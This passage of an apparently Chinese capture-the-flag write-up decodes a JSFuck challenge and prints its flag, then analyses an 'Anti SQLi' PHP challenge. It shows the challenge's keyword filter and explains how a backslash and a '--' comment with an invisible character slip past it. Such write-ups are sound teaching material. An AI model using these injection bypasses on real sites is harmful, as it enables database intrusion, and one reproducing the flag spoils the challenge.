![]+!![]]+(!![]+[])[+!![]]][(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(&#123;&#125;+[])[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+(!![]+[])[!![]+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+(&#123;&#125;+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+(&#123;&#125;+[])[+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!![]+!![]+!![]+!![]+!![]]+(&#123;&#125;+[])[+!![]]+([][[]]+[])[+!![]])()+[])[+[]]+(![]+[])[+!![]]+(!![]+[])[+!![]]+[][(![]+[])[+[]]+([][[]]+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+!![]]][(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(&#123;&#125;+[])[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+(!![]+[])[!![]+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+(&#123;&#125;+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(!![]+[])[!![]+!![]+!![]]+(![]+[])[!![]+!![]+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+([][(![]+[])[+[]]+([][[]]+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+!![]]][(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(&#123;&#125;+[])[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+(!![]+[])[!![]+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+(&#123;&#125;+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+(&#123;&#125;+[])[+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!![]+!![]+!![]+!![]+!![]]+(&#123;&#125;+[])[+!![]]+([][[]]+[])[+!![]])()+[])[!![]+!![]+!![]]+(!![]+[])[!![]+!![]+!![]])()((+!![]+[])[(![]+[])[!![]+!![]+!![]]+(!![]+[])[!![]+!![]]+(&#123;&#125;+[])[!![]+!![]]]())[!![]+!![]]+(&#123;&#125;+[])[+!![]]+([][[]]+[])[!![]+!![]]+(!![]+[])[!![]+!![]+!![]]]((!![]+!![]+!![]+!![]+[])+(!![]+!![]+!![]+!![]+!![]+!![]+!![]+[]),(!![]+!![]+!![]+!![]+[])+(!![]+!![]+[]),(+!![]+[])+(+[]+[]),(+!![]+[])+(+[]+[]),(!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[]),(+!![]+[])+(+[]+[])+(!![]+!![]+!![]+!![]+[]),(+!![]+[])+(+!![]+[])+(+!![]+[]),(+!![]+[])+(+!![]+[])+(!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[]),(!![]+!![]+!![]+[])+(!![]+!![]+[]),(!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[])+(!![]+!![]+!![]+!![]+!![]+!![]+!![]+[]),(+!![]+[])+(+!![]+[])+(!![]+!![]+!![]+!![]+[]),(+!![]+[])+(+[]+[])+(+!![]+[]),(!![]+!![]+!![]+[])+(!![]+!![]+[]),(+!![]+[])+(!![]+!![]+[])+(+!![]+[]),(+!![]+[])+(+!![]+[])+(+!![]+[]),(+!![]+[])+(+!![]+[])+(!![]+!![]+!![]+!![]+!![]+!![]+!![]+[]),(!![]+!![]+!![]+!![]+!![]+!![]+[])+(!![]+!![]+!![]+[]),(+!![]+[])+(+[]+[]),(+!![]+[])+(+[]+[]),(!![]+!![]+!![]+!![]+[])+(!![]+!![]+[]),(!![]+!![]+!![]+!![]+[])+(!![]+!![]+!![]+!![]+!![]+!![]+!![]+[])))()</span><br></pre></td></tr></table></figure>


<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">js &#x3D; &quot;......&quot; #jsfuck code</span><br><span class="line"></span><br><span class="line">alpha_dict &#x3D; &#123;</span><br><span class="line">	&#39;&quot;f&quot;&#39;: &#39;(![]+[])[+[]]&#39;,</span><br><span class="line">	&#39;&quot;i&quot;&#39;: &#39;([][[]]+[])[!![]+!![]+!![]+!![]+!![]]&#39;,</span><br><span class="line">	&#39;&quot;l&quot;&#39;: &#39;(![]+[])[!![]+!![]]&#39;,</span><br><span class="line">	&#39;&quot;t&quot;&#39;: &#39;(!![]+[])[+[]]&#39;,</span><br><span class="line">	&#39;&quot;e&quot;&#39;: &#39;(!![]+[])[!![]+!![]+!![]]&#39;,</span><br><span class="line">	&#39;&quot;r&quot;&#39;: &#39;(!![]+[])[+!![]]&#39;,</span><br><span class="line">	&#39;&quot;c&quot;&#39;: &#39;(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]&#39;,</span><br><span class="line">	&#39;&quot;o&quot;&#39;: &#39;(&#123;&#125;+[])[+!![]]&#39;,</span><br><span class="line">	&#39;&quot;n&quot;&#39;: &#39;([][[]]+[])[+!![]]&#39;,</span><br><span class="line">	&#39;&quot;s&quot;&#39;: &#39;(![]+[])[!![]+!![]+!![]]&#39;,</span><br><span class="line">	&#39;&quot;u&quot;&#39;: &#39;(!![]+[])[!![]+!![]]&#39;,</span><br><span class="line">	&#39;&quot; &quot;&#39;: &#39;(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]&#39;,</span><br><span class="line">	&#39;&quot;b&quot;&#39;: &#39;(&#123;&#125;+[])[!![]+!![]]&#39;,</span><br><span class="line">	&#39;&quot; &quot;&#39;: &#39;(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]&#39;,</span><br><span class="line">	&#39;&quot;a&quot;&#39;: &#39;(![]+[])[+!![]]&#39;,</span><br><span class="line">	&#39;&quot;2&quot;&#39;: &#39;(!![]+!![]+[])&#39;,</span><br><span class="line">	&#39;&quot;4&quot;&#39;: &#39;(!![]+!![]+!![]+!![]+[])&#39;,</span><br><span class="line">	&#39;&quot;7&quot;&#39;: &#39;(!![]+!![]+!![]+!![]+!![]+!![]+!![]+[])&#39;,</span><br><span class="line">	&#39;&quot;y&quot;&#39;: &#39;(+(+!![]+&quot;e&quot;+(+!![])+(+[])+(+[])+(+[]))+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]&#39;,</span><br><span class="line">	&#39;&quot;0&quot;&#39;: &#39;(+[]+[])&#39;,</span><br><span class="line">	&#39;&quot;3&quot;&#39;: &#39;(!![]+!![]+!![]+[])&#39;,</span><br><span class="line">	&#39;&quot;5&quot;&#39;: &#39;(!![]+!![]+!![]+!![]+!![]+[])&#39;,</span><br><span class="line">	&#39;&quot;1&quot;&#39;: &#39;(+!![]+[])&#39;,</span><br><span class="line">	&#39;&quot;9&quot;&#39;: &#39;(!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[])&#39;,</span><br><span class="line">	&#39;&quot;8&quot;&#39;: &#39;(!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[])&#39;,</span><br><span class="line">	&#39;&quot;6&quot;&#39;: &#39;(!![]+!![]+!![]+!![]+!![]+!![]+[])&#39;,</span><br><span class="line">	&#39;&quot;y&quot;&#39;: &#39;(+(+!![]+(!![]+[])[!![]+!![]+!![]]+(+!![])+(+[])+(+[])+(+[]))+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]&#39;,</span><br><span class="line">	&#39;&quot;d&quot;&#39;: &#39;([][[]]+[])[!![]+!![]]&#39;,</span><br><span class="line">	&#39;[3]&#39;: &#39;[!![]+!![]+!![]]&#39;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for key, value in alpha_dict.items():</span><br><span class="line">	js &#x3D; js.replace(value, key)</span><br><span class="line"></span><br><span class="line">clean_dict &#x3D; &#123;</span><br><span class="line">	&#39;&quot;p&quot;&#39;: &#39;([][&quot;filter&quot;][&quot;constructor&quot;](&quot;return &quot;+&quot;location&quot;)()+[])[3]&#39;,</span><br><span class="line">	&#39;&quot;constructor&quot;&#39;: &#39;&quot;c&quot;+&quot;o&quot;+&quot;n&quot;+&quot;s&quot;+&quot;t&quot;+&quot;r&quot;+&quot;u&quot;+&quot;c&quot;+&quot;t&quot;+&quot;o&quot;+&quot;r&quot;&#39;,</span><br><span class="line">	&#39;&quot;return &quot;&#39;: &#39;&quot;r&quot;+&quot;e&quot;+&quot;t&quot;+&quot;u&quot;+&quot;r&quot;+&quot;n&quot;+&quot; &quot;&#39;,</span><br><span class="line">	&#39;&quot;filter&quot;&#39;: &#39;&quot;f&quot;+&quot;i&quot;+&quot;l&quot;+&quot;t&quot;+&quot;e&quot;+&quot;r&quot;&#39;,</span><br><span class="line">	&#39;&quot;fontcolor&quot;&#39;: &#39;&quot;f&quot;+&quot;o&quot;+&quot;n&quot;+&quot;t&quot;+&quot;c&quot;+&quot;o&quot;+&quot;l&quot;+&quot;o&quot;+&quot;r&quot;&#39;,</span><br><span class="line">	&#39;&quot;location&quot;&#39;: &#39;&quot;l&quot;+&quot;o&quot;+&quot;c&quot;+&quot;a&quot;+&quot;t&quot;+&quot;i&quot;+&quot;o&quot;+&quot;n&quot;&#39;,</span><br><span class="line">	&#39;&quot;110&quot;&#39;: &#39;&quot;1&quot;+&quot;2&quot;+&quot;2&quot;,&quot;3&quot;+&quot;2&quot;,&quot;1&quot;+&quot;0&quot;+&quot;5&quot;,&quot;1&quot;+&quot;1&quot;+&quot;0&quot;&#39;,</span><br><span class="line">	&#39;&quot;111&quot;&#39;: &#39;&quot;1&quot;+&quot;1&quot;+&quot;1&quot;&#39;,</span><br><span class="line">	&#39;&quot;99&quot;&#39;: &#39;&quot;9&quot;+&quot;9&quot;&#39;,</span><br><span class="line">	&#39;&quot;98&quot;&#39;: &#39;&quot;9&quot;+&quot;8&quot;&#39;,</span><br><span class="line">	&#39;&quot;57&quot;&#39;: &#39;&quot;5&quot;+&quot;7&quot;&#39;,</span><br><span class="line">	&#39;&quot;101&quot;&#39;: &#39;&quot;1&quot;+&quot;0&quot;+&quot;1&quot;&#39;,</span><br><span class="line">	&#39;&quot;108&quot;&#39;: &#39;&quot;1&quot;+&quot;0&quot;+&quot;8&quot;&#39;,</span><br><span class="line">	&#39;&quot;106&quot;&#39;: &#39;&quot;1&quot;+&quot;0&quot;+&quot;6&quot;&#39;,</span><br><span class="line">	&#39;&quot;61&quot;&#39;: &#39;&quot;6&quot;+&quot;1&quot;&#39;,</span><br><span class="line">	&#39;&quot;112&quot;&#39;: &#39;&quot;1&quot;+&quot;1&quot;+&quot;2&quot;&#39;,</span><br><span class="line">	&#39;&quot;116&quot;&#39;: &#39;&quot;1&quot;+&quot;1&quot;+&quot;6&quot;&#39;,</span><br><span class="line">	&#39;&quot;40&quot;&#39;: &#39;&quot;4&quot;+&quot;0&quot;&#39;,</span><br><span class="line">	&#39;&quot;34&quot;&#39;: &#39;&quot;3&quot;+&quot;4&quot;&#39;,</span><br><span class="line">	&#39;&quot;119&quot;&#39;: &#39;&quot;1&quot;+&quot;1&quot;+&quot;9&quot;&#39;,</span><br><span class="line">	&#39;&quot;105&quot;&#39;: &#39;&quot;1&quot;+&quot;0&quot;+&quot;5&quot;&#39;,</span><br><span class="line">	&#39;&quot;102&quot;&#39;: &#39;&quot;1&quot;+&quot;0&quot;+&quot;2&quot;&#39;,</span><br><span class="line">	&#39;&quot;125&quot;&#39;: &#39;&quot;1&quot;+&quot;2&quot;+&quot;5&quot;&#39;,</span><br><span class="line">	&#39;&quot;102&quot;&#39;: &#39;&quot;1&quot;+&quot;0&quot;+&quot;2&quot;&#39;,</span><br><span class="line">	&#39;&quot;97&quot;&#39;: &#39;&quot;9&quot;+&quot;7&quot;&#39;,</span><br><span class="line">	&#39;&quot;100&quot;&#39;: &#39;&quot;1&quot;+&quot;0&quot;+&quot;0&quot;&#39;,</span><br><span class="line"># 	# &#39;&quot;u&quot;&#39;: &#39;(&quot;1&quot;[&quot;s&quot;+&quot;u&quot;+&quot;b&quot;]())[!![]+!![]]&#39;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for key, value in clean_dict.items():</span><br><span class="line">	js &#x3D; js.replace(value, key)</span><br><span class="line"></span><br><span class="line">print js</span><br></pre></td></tr></table></figure>
<p>将decode后的代码中数字部分再次decode：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">key&#x3D;[&quot;4&quot;+&quot;7&quot;,&quot;4&quot;+&quot;7&quot;,&quot;3&quot;+&quot;2&quot;,&quot;1&quot;+&quot;0&quot;+&quot;3&quot;,&quot;111&quot;,&quot;111&quot;,&quot;100&quot;,&quot;3&quot;+&quot;2&quot;,&quot;106&quot;,&quot;111&quot;,&quot;98&quot;,&quot;3&quot;+&quot;3&quot;,&quot;1&quot;+&quot;0&quot;,&quot;1&quot;+&quot;0&quot;,&quot;108&quot;,&quot;101&quot;,&quot;116&quot;,&quot;3&quot;+&quot;2&quot;,&quot;102&quot;,&quot;108&quot;,&quot;97&quot;,&quot;1&quot;+&quot;0&quot;+&quot;3&quot;,&quot;3&quot;+&quot;2&quot;,&quot;61&quot;,&quot;3&quot;+&quot;2&quot;,&quot;112&quot;,&quot;1&quot;+&quot;1&quot;+&quot;4&quot;,&quot;111&quot;,&quot;1&quot;+&quot;0&quot;+&quot;9&quot;,&quot;112&quot;,&quot;116&quot;,&quot;40&quot;,&quot;34&quot;,&quot;119&quot;,&quot;1&quot;+&quot;0&quot;+&quot;4&quot;,&quot;97&quot;,&quot;116&quot;,&quot;3&quot;+&quot;2&quot;,&quot;105&quot;,&quot;1&quot;+&quot;1&quot;+&quot;5&quot;,&quot;3&quot;+&quot;2&quot;,&quot;116&quot;,&quot;1&quot;+&quot;0&quot;+&quot;4&quot;,&quot;101&quot;,&quot;3&quot;+&quot;2&quot;,&quot;102&quot;,&quot;108&quot;,&quot;97&quot;,&quot;1&quot;+&quot;0&quot;+&quot;3&quot;,&quot;6&quot;+&quot;3&quot;,&quot;34&quot;,&quot;4&quot;+&quot;1&quot;,&quot;5&quot;+&quot;9&quot;,&quot;1&quot;+&quot;0&quot;,&quot;1&quot;+&quot;0&quot;,&quot;105&quot;,&quot;102&quot;,&quot;3&quot;+&quot;2&quot;,&quot;40&quot;,&quot;102&quot;,&quot;108&quot;,&quot;97&quot;,&quot;1&quot;+&quot;0&quot;+&quot;3&quot;,&quot;3&quot;+&quot;2&quot;,&quot;61&quot;,&quot;61&quot;,&quot;61&quot;,&quot;3&quot;+&quot;2&quot;,&quot;34&quot;,&quot;34&quot;,&quot;4&quot;+&quot;1&quot;,&quot;3&quot;+&quot;2&quot;,&quot;1&quot;+&quot;2&quot;+&quot;3&quot;,&quot;1&quot;+&quot;0&quot;,&quot;1&quot;+&quot;0&quot;,&quot;9&quot;,&quot;97&quot;,&quot;108&quot;,&quot;101&quot;,&quot;1&quot;+&quot;1&quot;+&quot;4&quot;,&quot;116&quot;,&quot;40&quot;,&quot;34&quot;,&quot;112&quot;,&quot;108&quot;,&quot;110&quot;,&quot;112&quot;,&quot;1&quot;+&quot;1&quot;+&quot;7&quot;,&quot;116&quot;,&quot;34&quot;,&quot;4&quot;+&quot;1&quot;,&quot;5&quot;+&quot;9&quot;,&quot;1&quot;+&quot;0&quot;,&quot;1&quot;+&quot;0&quot;,&quot;125&quot;,&quot;3&quot;+&quot;2&quot;,&quot;101&quot;,&quot;108&quot;,&quot;1&quot;+&quot;1&quot;+&quot;5&quot;,&quot;101&quot;,&quot;3&quot;+&quot;2&quot;,&quot;105&quot;,&quot;102&quot;,&quot;3&quot;+&quot;2&quot;,&quot;40&quot;,&quot;102&quot;,&quot;108&quot;,&quot;97&quot;,&quot;1&quot;+&quot;0&quot;+&quot;3&quot;,&quot;3&quot;+&quot;2&quot;,&quot;61&quot;,&quot;61&quot;,&quot;61&quot;,&quot;3&quot;+&quot;2&quot;,&quot;34&quot;,&quot;102&quot;,&quot;108&quot;,&quot;97&quot;,&quot;1&quot;+&quot;0&quot;+&quot;3&quot;,&quot;1&quot;+&quot;2&quot;+&quot;3&quot;,&quot;5&quot;+&quot;0&quot;,&quot;4&quot;+&quot;9&quot;,&quot;100&quot;,&quot;102&quot;,&quot;5&quot;+&quot;2&quot;,&quot;97&quot;,&quot;100&quot;,&quot;5&quot;+&quot;1&quot;,&quot;99&quot;,&quot;101&quot;,&quot;5&quot;+&quot;1&quot;,&quot;4&quot;+&quot;9&quot;,&quot;97&quot;,&quot;102&quot;,&quot;5&quot;+&quot;6&quot;,&quot;5&quot;+&quot;2&quot;,&quot;5&quot;+&quot;3&quot;,&quot;99&quot;,&quot;102&quot;,&quot;57&quot;,&quot;99&quot;,&quot;100&quot;,&quot;5&quot;+&quot;4&quot;,&quot;97&quot;,&quot;5&quot;+&quot;3&quot;,&quot;101&quot;,&quot;100&quot;,&quot;100&quot;,&quot;98&quot;,&quot;98&quot;,&quot;57&quot;,&quot;4&quot;+&quot;9&quot;,&quot;125&quot;,&quot;34&quot;,&quot;4&quot;+&quot;1&quot;,&quot;3&quot;+&quot;2&quot;,&quot;1&quot;+&quot;2&quot;+&quot;3&quot;,&quot;1&quot;+&quot;0&quot;,&quot;1&quot;+&quot;0&quot;,&quot;9&quot;,&quot;97&quot;,&quot;108&quot;,&quot;101&quot;,&quot;1&quot;+&quot;1&quot;+&quot;4&quot;,&quot;116&quot;,&quot;40&quot;,&quot;34&quot;,&quot;98&quot;,&quot;105&quot;,&quot;1&quot;+&quot;1&quot;+&quot;0&quot;,&quot;1&quot;+&quot;0&quot;+&quot;3&quot;,&quot;111&quot;,&quot;34&quot;,&quot;4&quot;+&quot;1&quot;,&quot;5&quot;+&quot;9&quot;,&quot;1&quot;+&quot;0&quot;,&quot;1&quot;+&quot;0&quot;,&quot;125&quot;,&quot;3&quot;+&quot;2&quot;,&quot;101&quot;,&quot;108&quot;,&quot;1&quot;+&quot;1&quot;+&quot;5&quot;,&quot;101&quot;,&quot;3&quot;+&quot;2&quot;,&quot;1&quot;+&quot;2&quot;+&quot;3&quot;,&quot;1&quot;+&quot;0&quot;,&quot;1&quot;+&quot;0&quot;,&quot;9&quot;,&quot;97&quot;,&quot;108&quot;,&quot;101&quot;,&quot;1&quot;+&quot;1&quot;+&quot;4&quot;,&quot;116&quot;,&quot;40&quot;,&quot;34&quot;,&quot;119&quot;,&quot;1&quot;+&quot;1&quot;+&quot;4&quot;,&quot;111&quot;,&quot;1&quot;+&quot;1&quot;+&quot;0&quot;,&quot;1&quot;+&quot;0&quot;+&quot;3&quot;,&quot;34&quot;,&quot;4&quot;+&quot;1&quot;,&quot;5&quot;+&quot;9&quot;,&quot;1&quot;+&quot;0&quot;,&quot;1&quot;+&quot;0&quot;,&quot;125&quot;]</span><br><span class="line">ans&#x3D;&quot;&quot;</span><br><span class="line">for i in key:</span><br><span class="line">	ans+&#x3D;chr(int(i))</span><br><span class="line">print ans</span><br></pre></td></tr></table></figure>
<p>得到关键源码,看到判断处即为flag：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; good job!</span><br><span class="line"></span><br><span class="line">let flag &#x3D; prompt(&quot;what is the flag?&quot;);</span><br><span class="line"></span><br><span class="line">if (flag &#x3D;&#x3D;&#x3D; &quot;&quot;) &#123;</span><br><span class="line"></span><br><span class="line">	alert(&quot;plnput&quot;);</span><br><span class="line"></span><br><span class="line">&#125; else if (flag &#x3D;&#x3D;&#x3D; &quot;flag&#123;21df4ad3ce31af845cf9cd6a5eddbb91&#125;&quot;) &#123;</span><br><span class="line"></span><br><span class="line">	alert(&quot;bingo&quot;);</span><br><span class="line"></span><br><span class="line">&#125; else &#123;</span><br><span class="line"></span><br><span class="line">	alert(&quot;wrong&quot;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="0x0D-Anti-SQLi"><a href="#0x0D-Anti-SQLi" class="headerlink" title="0x0D Anti SQLi"></a>0x0D Anti SQLi</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   &#x2F;&#x2F; It&#39;s &#39;Anti SQLi&#39; problem of &#39;Solve Me&#39;.</span><br><span class="line">   error_reporting(0);</span><br><span class="line">   require __DIR__.&#39;&#x2F;lib.php&#39;; </span><br><span class="line"></span><br><span class="line">   $id &#x3D; $_GET[&#39;id&#39;];</span><br><span class="line">   $pw &#x3D; $_GET[&#39;pw&#39;];</span><br><span class="line"></span><br><span class="line">   if(isset($id, $pw))&#123;</span><br><span class="line">       preg_match(</span><br><span class="line">           &#39;&#x2F;\.|\&#96;|&quot;|\&#39;|\\|\xA0|\x0B|0x0C|\t|\r|\n|\0|&#39;.</span><br><span class="line">           &#39;&#x3D;|&lt;|&gt;|\(|\)|@@|\|\||&amp;&amp;|#|\&#x2F;\*.*\*\&#x2F;|--[\s\xA0]|&#39;.</span><br><span class="line">           &#39;0x[0-9a-f]+|0b[01]+|x\&#39;[0-9a-f]+\&#39;|b\&#39;[01]+\&#39;|&#39;.</span><br><span class="line">           &#39;[\s\xA0\&#39;&quot;]+(as|or|and|r*like|regexp)[\s\xA0\&#39;&quot;]+|&#39;.</span><br><span class="line">           &#39;union[\s\xA0]+select|[\s\xA0](where|having)|&#39;.</span><br><span class="line">           &#39;[\s\xA0](group|order)[\s\xA0]+by|limit[\s\xA0]+\d|&#39;.</span><br><span class="line">           &#39;information_schema|procedure\s+analyse\s*&#x2F;is&#39;,</span><br><span class="line">           $id.&#39;,&#39;.$pw</span><br><span class="line">       ) and die(&#39;Hack detected&#39;);</span><br><span class="line"></span><br><span class="line">       $con &#x3D; mysqli_connect($sql_host, $sql_username, $sql_password, $sql_dbname)</span><br><span class="line">           or die(&#39;SQL server down&#39;);</span><br><span class="line"></span><br><span class="line">       $result &#x3D; mysqli_fetch_array(</span><br><span class="line">           mysqli_query(</span><br><span class="line">               $con, </span><br><span class="line">               &quot;SELECT * FROM &#96;antisqli&#96; WHERE &#96;id&#96;&#x3D;&#39;&#123;$id&#125;&#39; AND &#96;pw&#96;&#x3D;md5(&#39;&#123;$pw&#125;&#39;);&quot;</span><br><span class="line">           )</span><br><span class="line">       );</span><br><span class="line">       mysqli_close($con);</span><br><span class="line"></span><br><span class="line">       if(isset($result))&#123;</span><br><span class="line">           if($result[&#39;no&#39;] &#x3D;&#x3D;&#x3D; &#39;31337&#39;)&#123;</span><br><span class="line">               echo $flag;</span><br><span class="line">           &#125;else&#123;</span><br><span class="line">               echo &#39;Hello, &#39;, $result[&#39;id&#39;];</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;else&#123;</span><br><span class="line">           echo &#39;Login failed&#39;;</span><br><span class="line">       &#125;</span><br><span class="line">       echo &#39;&lt;hr&gt;&#39;;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>
<p>显然需要sql注入<br>不过存在过滤：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#x2F;\.|\&#96;|&quot;|\&#39;|\\|\xA0|\x0B|0x0C|\t|\r|\n|\0|&#39;.</span><br><span class="line">&#39;&#x3D;|&lt;|&gt;|\(|\)|@@|\|\||&amp;&amp;|#|\&#x2F;\*.*\*\&#x2F;|--[\s\xA0]|&#39;.</span><br><span class="line">&#39;0x[0-9a-f]+|0b[01]+|x\&#39;[0-9a-f]+\&#39;|b\&#39;[01]+\&#39;|&#39;.</span><br><span class="line">&#39;[\s\xA0\&#39;&quot;]+(as|or|and|r*like|regexp)[\s\xA0\&#39;&quot;]+|&#39;.</span><br><span class="line">&#39;union[\s\xA0]+select|[\s\xA0](where|having)|&#39;.</span><br><span class="line">&#39;[\s\xA0](group|order)[\s\xA0]+by|limit[\s\xA0]+\d|&#39;.</span><br><span class="line">&#39;information_schema|procedure\s+analyse\s*&#x2F;is&#39;</span><br></pre></td></tr></table></figure>
<p>首先发现对\的正则匹配有问题，应该是：<strong>\\\\</strong><br>前两个声明字符串的”&quot;，后两个声明字符串另一个”&quot;<br>最后在正则中为”\“,前一个转义后一个<br>所以这里我们可以id=\来转义前一个单引号使其不闭合造成注入<br>下面看到过滤了注释:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#|\&#x2F;\*.*\*\&#x2F;|--[\s\xA0]|</span><br></pre></td></tr></table></figure>
<p>注释可以使用–加上一个不可见字符绕过<br>剩下注意：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union[\s\xA0]+select</span><br></pre></td></tr></table></figure>
<p>union后不能直接加空格再加select<br>本来想/**/绕过,不过被过滤掉了：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\&#x2F;\*.*\*\&#x2F;</span><br></pre></td></tr></table></figure>
